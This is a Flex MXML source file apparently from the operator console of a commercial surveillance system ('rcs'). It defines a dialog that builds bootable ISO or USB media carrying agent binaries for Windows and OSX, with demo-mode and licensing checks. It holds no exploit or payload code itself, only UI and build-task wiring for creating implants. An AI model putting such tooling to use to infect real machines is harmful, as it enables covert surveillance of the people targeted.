<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%">
  
  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.monitor.controller.LicenseManager;
      import it.ht.rcs.console.task.controller.DownloadManager;
      import it.ht.rcs.console.utils.AlertPopUp;
      
      import locale.R;
      
      import mx.core.UIComponent;
      import mx.managers.PopUpManager;
      import mx.rpc.events.FaultEvent;
      import mx.rpc.events.ResultEvent;
      
      protected function create(event:MouseEvent):void
      {
        var params:Object;
        var filename:String;
        
        if (iso.selected) {
          params = {platform: 'iso', generate: {platforms: ['windows', 'osx'], binary: {demo: demo.selected} } };
          filename = parentDocument.factory.name + '_offline.iso'
        } else {
          params = {platform: 'usb', generate: {platforms: ['windows'], binary: {demo: demo.selected, admin: false}, melt: {admin: false} } };
          filename = parentDocument.factory.name + '_usb.zip'
        }
        
        params['factory'] = {_id: parentDocument.factory._id};
        
        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
      }
      
      private function onSuccess(e:ResultEvent):void
      {
        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
      }
      
      private function onFailure(e:FaultEvent):void
      {
        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
      }
      
    ]]>
  </fx:Script>
  
  <fx:Declarations>
    <s:RadioButtonGroup id="Media"/>
  </fx:Declarations>
    
  <s:VGroup left="10" top="10">
    <s:RadioButton id="iso" label="Bootable CD/DVD" fontWeight="bold" groupName="Media" selected="true"/>
    <s:RadioButton id="usb" label="Bootable USB drive" fontWeight="bold" groupName="Media"/>
  </s:VGroup>
  <s:Label left="150" top="15" text="Windows and OSX"/>
  <s:Label left="150" top="40" text="Windows only"/>
  
  <s:HGroup left="10" bottom="0" right="10" horizontalAlign="right">
    <s:CheckBox left="10" id="demo" label="Demo Mode" fontWeight="bold" 
                enabled="{LicenseManager.instance.canBuild('windows') || LicenseManager.instance.canBuild('osx')}"
                selected="{!demo.enabled}"/>
    <s:Button right="10" label="Create..." click="create(event)" />    
  </s:HGroup>
  
</s:Group>